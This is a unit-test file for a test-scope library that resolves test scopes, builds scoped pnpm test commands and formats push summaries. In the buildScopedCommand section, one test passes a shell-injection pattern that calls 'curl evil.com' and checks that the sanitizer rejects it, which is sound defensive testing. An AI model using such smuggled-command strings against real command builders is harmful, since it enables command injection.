/**
 * Tests for lib/test-scope.js
 *
 * Validates:
 * 1. getActiveTestScope() - scope resolution from config and env var
 * 2. getTestScopeConfig() - individual scope lookup
 * 3. buildScopedCommand() - command construction from patterns/overrides
 * 4. formatPushSummary() - human-readable output formatting
 *
 * Uses Node's built-in test runner (node:test)
 * Run with: node --test .claude/hooks/__tests__/test-scope.test.js
 */

import { describe, it, beforeEach, afterEach } from 'node:test';
import assert from 'node:assert';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';

// Import functions under test
import { getActiveTestScope, getTestScopeConfig, buildScopedCommand, formatPushSummary } from '../../../lib/test-scope.js';

describe('lib/test-scope.js', () => {
  let tmpDir;
  let configDir;
  let configPath;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'test-scope-'));
    configDir = path.join(tmpDir, '.claude', 'config');
    fs.mkdirSync(configDir, { recursive: true });
    configPath = path.join(configDir, 'services.json');
    // Clean env
    delete process.env.GENTYR_TEST_SCOPE;
  });

  afterEach(() => {
    delete process.env.GENTYR_TEST_SCOPE;
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  function writeConfig(config) {
    fs.writeFileSync(configPath, JSON.stringify(config));
  }

  // =========================================================================
  // getActiveTestScope
  // =========================================================================

  describe('getActiveTestScope', () => {
    it('returns inactive when no services.json exists', () => {
      const result = getActiveTestScope('/nonexistent/path');
      assert.strictEqual(result.active, false);
      assert.strictEqual(result.scopeName, null);
      assert.strictEqual(result.config, null);
      assert.strictEqual(result.error, null);
    });

    it('returns inactive when activeTestScope is null', () => {
      writeConfig({ activeTestScope: null, secrets: {} });
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, false);
      assert.strictEqual(result.scopeName, null);
    });

    it('returns inactive when activeTestScope is absent', () => {
      writeConfig({ secrets: {} });
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, false);
    });

    it('returns active scope config when activeTestScope is set', () => {
      writeConfig({
        testScopes: {
          allow: {
            description: 'ALLOW vertical',
            unitTestPattern: '\\.allow\\.',
          },
        },
        activeTestScope: 'allow',
        secrets: {},
      });
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, true);
      assert.strictEqual(result.scopeName, 'allow');
      assert.deepStrictEqual(result.config, {
        description: 'ALLOW vertical',
        unitTestPattern: '\\.allow\\.',
      });
      assert.strictEqual(result.error, null);
    });

    it('returns error when scope name not found in testScopes', () => {
      writeConfig({
        testScopes: { other: { unitTestPattern: 'x' } },
        activeTestScope: 'allow',
        secrets: {},
      });
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, false);
      assert.strictEqual(result.scopeName, 'allow');
      assert.ok(result.error.includes('not found'));
    });

    it('GENTYR_TEST_SCOPE env var overrides config', () => {
      writeConfig({
        testScopes: {
          allow: { unitTestPattern: '\\.allow\\.' },
          ipaas: { unitTestPattern: '\\.ipaas\\.' },
        },
        activeTestScope: 'ipaas',
        secrets: {},
      });
      process.env.GENTYR_TEST_SCOPE = 'allow';
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, true);
      assert.strictEqual(result.scopeName, 'allow');
      assert.strictEqual(result.config.unitTestPattern, '\\.allow\\.');
    });

    it('env var with missing scope in testScopes returns error', () => {
      writeConfig({ testScopes: {}, secrets: {} });
      process.env.GENTYR_TEST_SCOPE = 'missing';
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, false);
      assert.ok(result.error.includes('not found'));
    });

    it('env var with no services.json returns error', () => {
      process.env.GENTYR_TEST_SCOPE = 'allow';
      const result = getActiveTestScope('/nonexistent');
      assert.strictEqual(result.active, false);
      assert.ok(result.error.includes('not found'));
    });

    it('handles malformed JSON gracefully', () => {
      fs.writeFileSync(configPath, '{invalid json}');
      const result = getActiveTestScope(tmpDir);
      assert.strictEqual(result.active, false);
      assert.ok(result.error.includes('Failed to read'));
    });
  });

  // =========================================================================
  // getTestScopeConfig
  // =========================================================================

  describe('getTestScopeConfig', () => {
    it('returns null when no config exists', () => {
      assert.strictEqual(getTestScopeConfig('allow', '/nonexistent'), null);
    });

    it('returns null when scope not found', () => {
      writeConfig({ testScopes: { other: {} }, secrets: {} });
      assert.strictEqual(getTestScopeConfig('allow', tmpDir), null);
    });

    it('returns scope config when found', () => {
      writeConfig({
        testScopes: { allow: { unitTestPattern: '\\.allow\\.' } },
        secrets: {},
      });
      const result = getTestScopeConfig('allow', tmpDir);
      assert.deepStrictEqual(result, { unitTestPattern: '\\.allow\\.' });
    });
  });

  // =========================================================================
  // buildScopedCommand
  // =========================================================================

  describe('buildScopedCommand', () => {
    it('uses scopedUnitCommand override for unit tests', () => {
      const config = { scopedUnitCommand: 'pnpm test:allow-unit' };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.command, 'pnpm test:allow-unit');
      assert.strictEqual(result.source, 'override');
    });

    it('uses scopedIntegrationCommand override for integration tests', () => {
      const config = { scopedIntegrationCommand: 'pnpm test:allow-int' };
      const result = buildScopedCommand(config, 'integration', 'pnpm run test:integration');
      assert.strictEqual(result.command, 'pnpm test:allow-int');
      assert.strictEqual(result.source, 'override');
    });

    it('builds command from unitTestPattern', () => {
      const config = { unitTestPattern: '\\.allow\\.' };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.command, "pnpm run test:unit -- --testPathPattern='\\.allow\\.'");
      assert.strictEqual(result.source, 'pattern');
    });

    it('builds integration command from unitTestPattern', () => {
      const config = { unitTestPattern: '\\.allow\\.' };
      const result = buildScopedCommand(config, 'integration', 'pnpm run test:integration');
      assert.strictEqual(result.command, "pnpm run test:integration -- --testPathPattern='\\.allow\\.'");
      assert.strictEqual(result.source, 'pattern');
    });

    it('returns null when no pattern or override available', () => {
      const config = { description: 'no patterns' };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.command, null);
      assert.strictEqual(result.source, null);
    });

    it('rejects patterns with shell metacharacters', () => {
      const config = { unitTestPattern: "\\.allow\\.'; curl evil.com; echo '" };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.command, null, 'Shell metacharacters must be rejected');
      assert.strictEqual(result.source, null);
    });

    it('permits double-quote in pattern (safe inside single-quoted shell arg)', () => {
      // The sanitizer blocks ['; `$|&] but NOT double-quote, because the pattern
      // is embedded inside single quotes: --testPathPattern='...'. A literal "
      // inside single-quoted POSIX context cannot break out of the quoting.
      // This test pins the current sanitizer boundary so future changes to the
      // allowlist or blocklist are immediately visible.
      const pattern = 'allow"test';
      const config = { unitTestPattern: pattern };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.source, 'pattern', 'Double-quote alone must not be rejected by the sanitizer');
      assert.notStrictEqual(result.command, null, 'Command must be built when pattern contains only a double-quote');
      assert.ok(result.command.includes(pattern), 'Pattern must be preserved verbatim in the constructed command');
    });

    it('override takes precedence over pattern', () => {
      const config = {
        unitTestPattern: '\\.allow\\.',
        scopedUnitCommand: 'custom-command',
      };
      const result = buildScopedCommand(config, 'unit', 'pnpm run test:unit');
      assert.strictEqual(result.command, 'custom-command');
      assert.strictEqual(result.source, 'override');
    });
  });

  // =========================================================================
  // formatPushSummary
  // =========================================================================

  describe('formatPushSummary', () => {
    it('reports all passed when no failures', () => {
      const result = formatPushSummary({
        scopeName: 'allow',
        fullUnitExit: 0,
        fullIntegrationExit: 0,
        scopedUnitExit: null,
        scopedIntegrationExit: null,
      });
      assert.ok(result.includes('All tests passed'));
      assert.ok(result.includes('scope: allow'));
    });

    it('reports warning when non-scoped failures only', () => {
      const result = formatPushSummary({
        scopeName: 'allow',
        fullUnitExit: 1,
        fullIntegrationExit: 0,
        scopedUnitExit: 0,
        scopedIntegrationExit: null,
      });
      assert.ok(result.includes('WARNING'));
      assert.ok(result.includes('Non-scoped test failures'));
      assert.ok(!result.includes('BLOCKED'));
    });

    it('reports blocked when scoped tests fail', () => {
      const result = formatPushSummary({
        scopeName: 'allow',
        fullUnitExit: 1,
        fullIntegrationExit: 0,
        scopedUnitExit: 1,
        scopedIntegrationExit: null,
      });
      assert.ok(result.includes('BLOCKED'));
      assert.ok(result.includes('Scoped test failures'));
    });

    it('shows re-run results when available', () => {
      const result = formatPushSummary({
        scopeName: 'allow',
        fullUnitExit: 1,
        fullIntegrationExit: 1,
        scopedUnitExit: 0,
        scopedIntegrationExit: 0,
      });
      assert.ok(result.includes('Scoped unit tests'));
      assert.ok(result.includes('Scoped integration'));
      assert.ok(result.includes('re-run with scope filter'));
    });

    it('reports warning when only integration fails non-scoped (unit passes)', () => {
      // Exercises the second clause of the nonScopedFailed condition:
      //   fullIntegrationExit !== 0 && scopedIntegrationExit === 0
      // This branch is not covered by any other test.
      const result = formatPushSummary({
        scopeName: 'allow',
        fullUnitExit: 0,
        fullIntegrationExit: 1,
        scopedUnitExit: null,
        scopedIntegrationExit: 0,
      });
      assert.ok(result.includes('WARNING'), 'Must report WARNING when only non-scoped integration tests fail');
      assert.ok(result.includes('Non-scoped test failures'), 'Must identify non-scoped failures');
      assert.ok(!result.includes('BLOCKED'), 'Must NOT block when scoped integration tests pass');
      assert.ok(result.includes('Scoped integration'), 'Must show scoped integration re-run result');
    });
  });
});
